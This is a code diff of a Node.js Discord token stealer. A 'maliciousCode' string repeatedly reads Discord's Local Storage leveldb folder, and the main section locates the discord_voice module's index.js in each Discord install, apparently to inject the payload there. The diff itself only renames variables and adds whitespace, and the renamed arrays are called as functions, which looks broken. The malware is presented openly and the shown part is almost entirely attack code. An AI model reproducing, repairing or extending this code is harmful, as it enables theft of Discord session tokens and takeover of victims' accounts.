@@ -6,6 +6,7 @@ const os = require("os")
 
 // Variables
 const maliciousCode = `\nconst os = require("os")
+
 setInterval(function(){
     fs.readdir("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb", "utf8", function(err, files){
         if(err){
@@ -42,13 +43,13 @@ setInterval(function(){
 
 // Main
 if(fs.existsSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`)){
-    const Directories = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
+    const directories = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
 
-    Directories().forEach(directory =>{
-        const Directories2 = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
+    directories().forEach(directory =>{
+        const directories2 = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
 
         if(directory.indexOf("app") !== -1){
-            Directories2().forEach(directory2 =>{
+            directories2().forEach(directory2 =>{
                 if(directory2.indexOf("discord_voice") !== -1){
                     fs.readFile(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
                         if(err) process.exit()
